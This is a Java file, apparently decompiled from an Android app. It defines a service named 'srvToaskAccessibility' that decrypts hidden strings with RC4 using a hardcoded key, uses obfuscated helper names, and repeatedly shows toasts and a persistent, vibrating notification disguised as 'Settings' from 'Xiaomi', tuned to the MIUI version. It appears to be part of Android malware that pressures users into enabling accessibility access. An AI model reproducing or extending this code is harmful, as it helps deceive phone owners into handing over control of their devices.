package com.example.mmm.Service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.Notification.BigTextStyle;
import android.app.Notification.Builder;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Build;
import android.os.IBinder;
import android.os.Build.VERSION;
import android.util.Base64;
import android.widget.Toast;
import com.example.mmm.constants;
import com.example.mmm.mainActivity;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;

public class srvToaskAccessibility extends Service {
   utils promote$ = new utils();
   constants settled$ = new constants();

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   private void a(Context var1, String var2) {
      if (VERSION.SDK_INT > 25) {
         NotificationManager var3 = (NotificationManager)var1.getSystemService("notification");
         PendingIntent var4 = PendingIntent.getActivity(var1, 0, new Intent(this, mainActivity.class), 0);
         String var5 = "channel_1";
         String var6 = "Xiaomi";
         NotificationChannel var7 = new NotificationChannel(var5, "123", 4);
         var7.setDescription(var6);
         var7.enableLights(true);
         var7.setLightColor(-65536);
         var7.enableVibration(true);
         var7.setVibrationPattern(new long[]{1500L, 1500L, 1500L, 1500L, 1500L});
         var7.setShowBadge(false);
         var3.createNotificationChannel(var7);
         Builder var9 = (new Builder(var1, var5)).setContentTitle("Title");
         Resources var10 = var1.getResources();
         StringBuilder var11 = new StringBuilder();
         var11.append(var1.getPackageName());
         var11.append(":mipmap/ic_launcher");
         Notification var8 = var9.setSmallIcon(var10.getIdentifier(var11.toString(), (String)null, (String)null)).setContentTitle("Settings").setContentText(var2).setVibrate(new long[]{1500L, 1500L, 1500L, 1500L, 1500L}).setCategory("msg").setStyle((new BigTextStyle()).bigText(var2)).setAutoCancel(false).setContentIntent(var4).setDefaults(2).setDefaults(1).setDefaults(4).build();
         var8.flags |= 16;
         var3.notify(1, var8);
      }

   }

   public IBinder onBind(Intent var1) {
      throw new UnsupportedOperationException("");
   }

   public int onStartCommand(Intent var1, int var2, int var3) {
      utils var4 = new utils();
      Toast var7;
      if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER)) {
         if (utils.getMiuiVersion() >= 11) {
            StringBuilder var6 = new StringBuilder();
            var6.append(var4._ranch());
            var6.append(var4._numbers());
            var7 = Toast.makeText(this, var6.toString(), 1);
            StringBuilder var5 = new StringBuilder();
            var5.append(var4._ranch());
            var5.append(var4._numbers());
            this.a(this, var5.toString());
         } else if (utils.getMiuiVersion() == 10) {
            var7 = Toast.makeText(this, var4._numbers(), 1);
            this.a(this, var4._numbers());
         } else {
            var7 = Toast.makeText(this, var4._numbers(), 1);
         }
      } else {
         var7 = Toast.makeText(this, var4._numbers(), 1);
      }

      var7.show();
      this.stopSelf();
      return var2;
   }
}
